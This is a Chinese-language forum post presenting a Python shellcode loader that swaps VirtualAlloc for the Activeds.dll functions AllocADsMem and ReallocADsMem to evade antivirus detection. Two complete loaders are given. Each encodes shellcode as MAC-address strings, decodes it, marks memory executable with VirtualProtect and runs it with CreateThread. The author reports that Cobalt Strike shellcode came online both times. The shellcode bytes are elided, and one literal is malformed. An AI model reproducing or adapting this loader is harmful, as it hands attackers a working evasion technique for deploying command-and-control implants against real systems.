内存申请
====

在现在许多的shellcode加载器中，内存申请是必不可少的一部分，常用的就是VirtualAlloc函数来申请一块动态内存来存放我们的shellcode。

再后来，为了逃避检测申请内存的行为，采用了渐进式加载模式，也就是申请一块可读可写不可执行的内存，使用VirtualProtect函数将内存区块设置为可执行，从而规避检测。

然而现在也有杀软对VirtualAlloc和VirtualProtect连用进行查杀。。。。

新发现
===

在前几天找mac，ipv4那些内存加载函数时，一同发现了两个有意思的AllocADsMem和ReallocADsMem函数，竟然能申请内存？哎嗨？好玩。今就研究研究能利用一下不。

函数介绍
====

### AllocADsMem

该函数在Activeds.dll库中，可以分配的指定大小的存储块。

函数原型：

<https://docs.microsoft.com/en-us/windows/win32/api/adshlp/nf-adshlp-allocadsmem>

```php
LPVOID AllocADsMem(
  DWORD cb
);
```

参数是要分配的内存大小，成功调用则返回一个指向已分配内存的非NULL指针， 如果不成功，则返回NULL。

看这描述就是申请一个内存啊，但是测试发现该内存可读可写不可执行，所以可以用VirtualProtect修改为可执行属性

```php
ptr1 = ctypes.windll.Activeds.AllocADsMem(len(shellcode))
ctypes.windll.kernel32.VirtualProtect(ptr1, len(shellcode), 0x40, ctypes.byref(ctypes.c_long(1)))
```

### ReallocADsMem

该函数在 Activeds.dll库中，可以复制指定内存内容，并新申请一块内存用来存储

函数原型：

<https://docs.microsoft.com/en-us/windows/win32/api/adshlp/nf-adshlp-reallocadsmem>

```php
LPVOID ReallocADsMem(
  LPVOID pOldMem,
  DWORD  cbOld,
  DWORD  cbNew
);
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9970d103c72822b329736bd119e46b29153e95f9.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9970d103c72822b329736bd119e46b29153e95f9.png)

调用成功返回一个指向新分配内存的指针，否则返回NULL。

看介绍啊，这个函数干了两个函数的事，申请内存和复制内存，但是只能从内存中复制

但是我们就是愁怎么往内存中复制内容，所以这个函数看着很鸡肋

但是突发奇想，这函数能不能混淆视线，用AllocADsMem申请的内存我不用就是玩，我用ReallocADsMem将内容复制出来申请一个新内存，将该内存改为可执行。

```php
ptr2 = ctypes.windll.Activeds.ReallocADsMem(ptr,len(shellcode),len(shellcode))
ctypes.windll.kernel32.VirtualProtect(ptr2, len(shellcode), 0x40, ctypes.byref(ctypes.c_long(1)))
```

测试
==

使用的mac加载器，测试的将VirtualAlloc替换为AllocADsMem函数，并改为可执行内存

环境py2.7，使用cs生成的64位shellcode

```php
import ctypes

shellcode = b"\xfc\x48\x83\"

macmem = ctypes.windll.Activeds.AllocADsMem(len(shellcode)/6*17)
for i in range(len(shellcode)/6):
     bytes_a = shellcode[i*6:6+i*6]
     ctypes.windll.Ntdll.RtlEthernetAddressToStringA(bytes_a, macmem+i*17)

list = []
for i in range(len(shellcode)/6):
    d = ctypes.string_at(macmem+i*17,17)
    list.append(d)

ptr = ctypes.windll.Activeds.AllocADsMem(len(list)*6)
rwxpage = ptr
for i in range(len(list)):
    ctypes.windll.Ntdll.RtlEthernetStringToAddressA(list[i], list[i], rwxpage)
    rwxpage += 6

ctypes.windll.kernel32.VirtualProtect(ptr, len(list)*6, 0x40, ctypes.byref(ctypes.c_long(1)))
handle = ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleO bject(handle, -1)
```

成功上线  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-082e917a4f4e2c3e71d5206020203e1f8548a953.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-082e917a4f4e2c3e71d5206020203e1f8548a953.png)

接下来用ReallocADsMem来混淆一下视线，AllocADsMem申请的内存可读可写即可，ReallocADsMem申请的内存改为可执行

相同环境，测试上线

```php
import ctypes

shellcode = b"\xfc\x48\x83......"

macmem = ctypes.windll.Activeds.AllocADsMem(len(shellcode)/6*17)
for i in range(len(shellcode)/6):
     bytes_a = shellcode[i*6:6+i*6]
     ctypes.windll.Ntdll.RtlEthernetAddressToStringA(bytes_a, macmem+i*17)

list = []
for i in range(len(shellcode)/6):
    d = ctypes.string_at(macmem+i*17,17)
    list.append(d)

ptr = ctypes.windll.Activeds.AllocADsMem(len(list)*6)
rwxpage = ptr
for i in range(len(list)):
    ctypes.windll.Ntdll.RtlEthernetStringToAddressA(list[i], list[i], rwxpage)
    rwxpage += 6

ptr2 = ctypes.windll.Activeds.ReallocADsMem(ptr,len(list)*6,len(list)*6)
ctypes.windll.kernel32.VirtualProtect(ptr2, len(list)*6, 0x40,ctypes.byref(ctypes.c_long(1)))

handle = ctypes.windll.kernel32.CreateThread(0, 0, ptr2, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleO bject(handle, -1)
```

依旧成功上线  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6860743e049087a12239cf7eedf57c69934a0cdf.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6860743e049087a12239cf7eedf57c69934a0cdf.png)

小结
==

免杀没有测试，只是分享思路，申请内存函数不只是那一个能用。